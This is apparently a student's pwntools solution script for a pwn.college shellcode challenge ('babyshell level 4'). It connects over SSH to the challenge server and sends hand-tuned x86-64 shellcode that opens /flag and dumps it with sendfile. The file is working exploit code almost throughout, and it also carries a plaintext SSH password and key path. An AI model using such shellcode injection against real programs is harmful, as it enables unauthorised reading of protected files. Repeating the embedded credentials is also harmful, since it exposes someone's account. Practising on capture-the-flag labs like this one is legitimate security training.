from pwn import *

e = ELF('./babyshell_level4_testing1')
# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
p = s.run('/babyshell_level4_testing1')

context.arch = e.arch
context.os = e.os

pay = shellcraft.open('/flag',0)
pay += shellcraft.sendfile(1,"rax",0,0xff)
print(pay)
pay = f'''
/* open(file='/flag', oflag=0, mode=0) */
/* push b'/flag\x00' */
xor rax, rax
push rax
mov eax, 0x67616c66
shl rax, 8
xor al, 0x2f
xor [rsp], rax
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
push SYS_open /* 2 */
pop rax
syscall
/* sendfile(out_fd=1, in_fd='rax', offset=0, count=0xff) */
xor r10d, r10d
mov r10b, 0xff
push 1
pop rdi
xor edx, edx /* 0 */
mov rsi, rax
/* call sendfile() */
push SYS_sendfile /* 0x28 */
pop rax
syscall

'''
print(pay)
pay = asm(pay)
print(pay)
p.send(pay)

p.interactive()